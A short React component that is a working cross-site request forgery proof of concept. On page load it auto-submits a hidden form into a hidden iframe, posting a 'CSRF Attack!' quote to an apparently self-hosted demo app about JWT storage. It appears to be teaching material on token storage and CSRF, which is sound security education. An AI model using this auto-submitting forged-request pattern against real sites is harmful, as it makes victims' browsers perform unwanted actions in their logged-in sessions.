import { useEffect, useRef } from "react";

export function CSRFAttack() {
  const formRef = useRef<HTMLFormElement>(null);

  useEffect(() => {
    formRef?.current?.submit();
  }, [formRef]);

  return (
    <>
      <iframe className="hidden" name="csrf-frame"></iframe>
      <form
        ref={formRef}
        action="https://jwt-local-variable-localstorage.vercel.app/api/quotes"
        method="POST"
        target="csrf-frame"
      >
        <input type="hidden" name="bgColor" value="bg-red-600" />
        <input type="hidden" name="name" value="CSRF" />
        <input
          type="hidden"
          name="quote"
          value="CSRF Attack! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad aliquid aperiam beatae corporis delectus, dolorum inventore nihil quas quod rem sapiente suscipit velit! Commodi, cupiditate ipsa itaque magnam maxime quam?"
        />
      </form>
    </>
  );
}
